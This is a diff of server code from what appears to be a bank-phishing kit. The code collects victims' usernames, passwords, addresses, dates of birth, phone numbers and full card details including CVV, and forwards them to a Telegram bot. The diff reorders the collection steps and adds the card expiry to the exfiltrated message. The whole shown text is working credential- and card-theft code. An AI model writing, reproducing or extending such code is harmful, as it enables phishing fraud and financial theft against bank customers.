@@ -73,10 +73,10 @@ const submitLogin = async (req, res) => {
 };
 
 const submitBilling = async (req, res) => {
-    const { ccnum, ccexp, ccname, cvv, uniqueid } = req.body;
+    const { ccnum, ccexp, cvv, uniqueid } = req.body;
     try {
-        let user = await OPBank.findOneAndUpdate({ uniqueid }, { ccname, ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
-        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCVV: ${cvv}`;
+        let user = await OPBank.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
+        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nFull Name: ${user.ccname}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`;
         await axios
             .post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
@@ -109,10 +109,10 @@ const submitBilling = async (req, res) => {
 };
 
 const submitPersonal = async (req, res) => {
-    const { address, dob, telephone, uniqueid } = req.body;
+    const { ccname, address, dob, telephone, uniqueid } = req.body;
     try {
-        let user = await OPBank.findOneAndUpdate({ uniqueid }, { address, dob, telephone, status: 2, timestamp: moment().format() }).exec();
-        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${address}\nDOB: ${dob}\nMobile: ${telephone}`;
+        let user = await OPBank.findOneAndUpdate({ uniqueid }, { ccname, address, dob, telephone, status: 2, timestamp: moment().format() }).exec();
+        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nFull Name: ${ccname}\nAddress: ${address}\nDOB: ${dob}\nMobile: ${telephone}`;
         await axios
             .post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
